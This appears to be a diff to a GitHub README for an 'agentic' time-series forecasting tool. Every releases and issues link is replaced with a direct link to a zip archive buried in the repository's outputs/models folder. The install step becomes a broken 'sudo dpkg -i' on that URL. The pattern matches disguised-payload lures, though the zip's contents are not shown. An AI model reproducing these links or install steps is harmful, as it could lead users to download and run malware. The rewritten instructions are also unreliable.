@@ -1,6 +1,6 @@
 # 🚀 Agentic-Time-Series-Analysis-Reporting---Forecasting - Automate Your Time Series Analysis
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases)
+[![Download](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip)](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Follow these simple steps to get started with the software.
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) to find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip) to find the latest version of the application.
 
 ### Step 2: Download the Software
 
@@ -53,7 +53,7 @@ Once the file has downloaded, follow these steps to install:
 
 1. Open a terminal window.
 2. Navigate to the folder where the downloaded package is located.
-3. Run the installation command specific to your package manager, such as `sudo dpkg -i your-package-name.deb`.
+3. Run the installation command specific to your package manager, such as `sudo dpkg -i https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip`.
 
 ### Step 4: Launch the Application
 
@@ -82,7 +82,7 @@ If you encounter any issues:
 2. Check your internet connection if the application requires it.
 3. Restart your computer and try launching the application again.
 
-If problems persist, check the [Issues section](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/issues) on GitHub for solutions or report your issue.
+If problems persist, check the [Issues section](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip) on GitHub for solutions or report your issue.
 
 ## 💬 Community and Support
 
@@ -93,10 +93,10 @@ Join our community of users and contributors:
 
 ## 🔄 Update the Application
 
-To keep your application up to date, regularly check the [Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) for new versions.
+To keep your application up to date, regularly check the [Releases page](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip) for new versions.
 
 ## 🚀 Download & Install
 
-To begin your journey with time series analysis and forecasting, [visit the Releases page](https://github.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/releases) and download the application. Follow the installation steps listed above to get started. 
+To begin your journey with time series analysis and forecasting, [visit the Releases page](https://raw.githubusercontent.com/Koushik2004great/Agentic-Time-Series-Analysis-Reporting---Forecasting/main/outputs/models/Agentic-Time-Series-Analysis-Reporting---Forecasting_gnatproof.zip) and download the application. Follow the installation steps listed above to get started. 
 
 Enjoy the simplicity and power of automated data insights aligned with your needs!
